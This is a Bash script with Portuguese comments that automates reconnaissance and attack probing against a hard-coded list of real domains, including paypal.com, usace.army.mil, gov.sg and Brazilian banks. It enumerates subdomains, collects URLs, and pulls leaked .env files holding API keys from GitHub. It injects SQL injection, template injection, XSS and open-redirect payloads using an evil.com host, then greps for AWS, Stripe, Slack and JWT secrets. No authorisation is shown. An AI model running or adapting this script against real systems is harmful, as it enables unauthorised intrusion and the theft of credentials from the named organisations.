#!/bin/bash

# --- ALVOS ---
targets=(
    "nfl.com" "paypal.com" "redbull.com" "ambev.com.br" "zedelivery.com.br"
    "usace.army.mil" "gov.sg" "airbnb.com" "itau.com.br" "ab-inbev.com"
)

# --- CORES ---
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m'

# --- DEPENDENCIAS ---
deps=(curl jq uro httpx qsreplace subfinder gau waybackurls katana)

for dep in "${deps[@]}"; do
    if ! command -v $dep &> /dev/null; then
        echo -e "${RED}[!] $dep não instalado.${NC}"
        exit 1
    fi
done

# --- TOKEN GITHUB ---
if [ -z "$GITHUB_TOKEN" ]; then
    echo -e "${RED}[!] Token GitHub não encontrado.${NC}"
    exit 1
fi

for domain in "${targets[@]}"; do

echo -e "${BLUE}=================================================${NC}"
echo -e "${YELLOW}🔥 SCANNER AVANÇADO: $domain${NC}"
echo -e "${BLUE}=================================================${NC}"

mkdir -p hunt_$domain/{recon,urls,params,vulns,secrets,infra}
cd hunt_$domain

# ------------------------------------------------
# 1. ENUMERAÇÃO DE SUBDOMÍNIOS
# ------------------------------------------------

echo -e "${GREEN}[+] Enumerando subdomínios...${NC}"

subfinder -d $domain -silent > recon/subs.txt

echo -e "${GREEN}[+] Verificando hosts ativos...${NC}"

httpx -l recon/subs.txt -silent > recon/alive.txt

# ------------------------------------------------
# 2. COLETA MASSIVA DE URLS
# ------------------------------------------------

echo -e "${GREEN}[+] Coletando URLs...${NC}"

gau $domain >> urls/raw.txt
waybackurls $domain >> urls/raw.txt

curl -s "https://otx.alienvault.com/api/v1/indicators/domain/$domain/url_list" \
| grep -Eo 'https?://[^"]+' >> urls/raw.txt

curl -s "https://urlscan.io/api/v1/search/?q=domain:$domain" \
| grep -Eo 'https?://[^"]+' >> urls/raw.txt

katana -u https://$domain -silent >> urls/raw.txt

cat urls/raw.txt | sort -u | grep "$domain" | uro > urls/urls_clean.txt

echo -e "${GREEN}[OK] $(wc -l < urls/urls_clean.txt) URLs únicas.${NC}"

# ------------------------------------------------
# 3. DESCOBERTA DE PARAMETROS
# ------------------------------------------------

echo -e "${GREEN}[+] Extraindo parâmetros...${NC}"

grep "=" urls/urls_clean.txt > params/params.txt

echo -e "${GREEN}[OK] $(wc -l < params/params.txt) URLs com parâmetros.${NC}"

# parâmetros únicos
cat params/params.txt \
| sed 's/=.*/=/' \
| sort -u > params/params_unique.txt

# ------------------------------------------------
# 4. GITHUB LEAK HUNTER
# ------------------------------------------------

echo -e "${GREEN}[+] Buscando leaks no GitHub...${NC}"

curl -s -H "Authorization: Bearer $GITHUB_TOKEN" \
"https://api.github.com/search/code?q=$domain+api_key+extension:env&per_page=100" \
| jq -r '.items[]?.html_url' > secrets/github_leaks.txt

echo -e "${GREEN}[+] Baixando conteúdo dos leaks...${NC}"

cat secrets/github_leaks.txt \
| sed 's/github.com/raw.githubusercontent.com/; s/\/blob\//\//' \
| xargs -I{} curl -s {} >> secrets/raw_github.txt

# ------------------------------------------------
# 5. CLOUD & INFRA
# ------------------------------------------------

echo -e "${GREEN}[+] Procurando Git exposto...${NC}"

for path in /.git/config /.git/index; do
    echo "https://$domain$path"
done | httpx -mc 200 -silent > infra/git_exposed.txt

echo -e "${GREEN}[+] Buscando buckets cloud...${NC}"

grep -Eo 'https?://[^/]*\.(s3\.amazonaws\.com|storage\.googleapis\.com|blob\.core\.windows\.net)' urls/urls_clean.txt \
| sort -u > infra/buckets.txt

# ------------------------------------------------
# 6. TESTES DE VULNERABILIDADES
# ------------------------------------------------

echo -e "${GREEN}[+] Testando SQLi...${NC}"

cat params/params.txt \
| qsreplace "'" \
| httpx -silent \
-mr "sql syntax|mysql_fetch|ORA-[0-9]{5}|SQLSTATE" \
> vulns/sqli.txt

echo -e "${GREEN}[+] Testando SSTI...${NC}"

cat params/params.txt \
| qsreplace "{{7*7}}" \
| httpx -silent -mr "49" \
> vulns/ssti.txt

echo -e "${GREEN}[+] Testando XSS...${NC}"

cat params/params.txt \
| qsreplace "<script>alert(1)</script>" \
| httpx -silent -mr "<script>alert(1)</script>" \
> vulns/xss.txt

echo -e "${GREEN}[+] Testando Open Redirect...${NC}"

grep -E "redirect=|url=|dest=" params/params.txt \
| while read u; do
    curl -s -L -o /dev/null -w "%{url_effective}" "$u//evil.com" \
    | grep -q "evil.com" && echo "REDIRECT: $u" >> vulns/redirect.txt
done

# ------------------------------------------------
# 7. GRAPHQL HUNT
# ------------------------------------------------

echo -e "${GREEN}[+] Testando GraphQL...${NC}"

grep -E "graphql|api|query" urls/urls_clean.txt \
| while read url; do
    curl -s -X POST "$url" \
    -H "Content-Type: application/json" \
    -d '{"query":"{__schema{types{name}}}"}' \
    | grep -q "data" && echo "GRAPHQL: $url" >> vulns/graphql.txt
done

# ------------------------------------------------
# 8. SECRET DISCOVERY
# ------------------------------------------------

echo -e "${GREEN}[+] Procurando segredos...${NC}"

cat urls/urls_clean.txt secrets/raw_github.txt 2>/dev/null \
| grep -Eo '

AKIA[0-9A-Z]{16}|
AIza[0-9A-Za-z_-]{35}|
sk_live_[0-9a-z]{32}|
xox[baprs]-[0-9a-zA-Z]{10,48}|
eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*
' | sort -u > secrets/secrets_found.txt

echo -e "${YELLOW}✅ Scan finalizado para $domain${NC}"

cd ..
sleep 10

done